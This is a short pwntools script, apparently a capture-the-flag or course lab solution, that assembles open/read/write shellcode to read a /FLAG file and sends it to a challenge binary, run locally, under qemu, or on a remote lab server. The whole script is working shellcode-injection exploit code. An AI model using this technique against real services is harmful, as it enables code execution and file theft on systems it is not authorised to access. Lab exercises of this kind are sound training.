from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 12341

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


# r.sendline(b'open /FLAG')
# r.sendline(b'read')
# r.sendline(b'write')

sc = shellcraft.open("/FLAG", 0)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)

print(shellcode)

r.recvuntil(b'code> ')
r.send(shellcode)

print(r.recv())

r.close()

# r.interactive()